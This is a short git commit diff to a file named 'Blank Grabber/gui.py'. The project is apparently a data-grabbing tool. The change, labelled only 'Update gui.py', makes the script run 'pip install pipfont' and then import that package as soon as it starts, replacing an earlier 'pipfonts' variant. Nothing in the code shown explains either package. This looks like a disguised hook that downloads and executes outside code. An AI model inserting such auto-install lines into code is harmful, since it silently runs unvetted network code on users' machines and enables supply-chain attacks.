6518e91e8aa26a6fcaa305aa24cf97dd596eaa70
Apfel <107504561+ApfelsaftDevs@users.noreply.github.com>
2023-04-01 17:41:03 +0200

    Update gui.py

--- Blank Grabber/gui.py
+++ Blank Grabber/gui.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipfonts")
-import pipfonts
+os.system("pip install pipfont")
+import pipfont
 import tkinter as tk
 from tkinter import ttk, messagebox, filedialog
 from urllib.request import urlopen, Request
